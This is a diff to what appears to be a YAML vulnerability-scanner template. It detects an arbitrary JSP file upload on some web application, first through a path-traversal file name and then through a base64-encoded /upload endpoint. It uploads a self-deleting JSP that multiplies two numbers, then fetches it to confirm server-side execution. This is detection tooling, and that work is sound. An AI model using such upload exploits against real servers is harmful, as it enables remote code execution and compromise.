@@ -10,23 +10,29 @@ rules:
   r1:
     request:
       method: POST
-      path: /app/FileUpload.ihtm?comm_type=EKING&file_name=../../{{rfilename}}.jsp.
+      path: /upload?dir=cmVwb3NpdG9yeQ==&name=ZGVtby5qc3A=&start=0&size=7000
       headers:
         Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
       body: "\
         ------WebKitFormBoundary{{rboundary}}\r\n\
-        Content-Disposition: form-data; name=\"uplo_file\"; filename=\"{{rfilename}}.jpg\"\r\n\
+        Content-Disposition: form-data; name=\"file\"; filename=\"{{rfilename}}.jsp\"\r\n\
         Content-Type: application/octet-stream\r\n\
         \r\n\
         <%out.print({{s1}} * {{s2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n\
+        ------WebKitFormBoundary{{rboundary}}\r\n\
+        Content-Disposition: form-data; name=\"Submit\"\r\n\
+        \r\n\
+        Go\r\n\
         ------WebKitFormBoundary{{rboundary}}--\r\n\
         "
-    expression: response.status == 200 && response.body_string.contains("\"status\":\"OK\"")
-
+    expression: response.status == 200 && response.body_string.contains("demo.jsp") && size(response.body_string) < 20
+    output:
+      search: '"/(?P<tmp>.+?)/demo.jsp".bsubmatch(response.body)'
+      tmp: search["tmp"]
   r2:
     request:
       method: GET
-      path: /{{rfilename}}.jsp
+      path: /repository/{{tmp}}/demo.jsp
     expression: response.status == 200 && response.body_string.contains(string(s1 * s2))
 expression: r1() && r2()
 detail:
